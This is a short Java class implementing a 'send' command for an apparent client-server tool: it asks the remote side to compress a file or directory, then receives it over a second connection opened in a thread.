package commands;

import java.io.IOException;
import java.net.Socket;

import connection.Connection;
import connection.Server;

public class SendCommand extends Command{
	private String _command;
	
	public SendCommand() {
		super("send", "\"file/dir\"", "compress and sends the specified file/dir");
	}

	protected boolean parse(String command) {
		boolean ok = false;
		
		if(command.contains(_commandName)) {
			_command = command;
			ok = true;
		}
		
		return ok;
	}
	
	@Override
	public void execute(Connection con, Server server) throws IOException, InterruptedException {
		String response = con.send(_command);
		System.out.println(response);
		
		if(response.contains("File compressed")) {
			String fileName = con.receive();
			
			Thread t = new Thread() {
		    	public void run() {
		    		Connection temp = null;
			    	try {
					    temp = server.connect();
					    temp.receive(fileName);
			    	}catch(IOException e1){
			    		try{temp.end();}catch(IOException e2) {};
			    	}
		    	}
		    };
			t.start();
			t.join();

		}
	}
}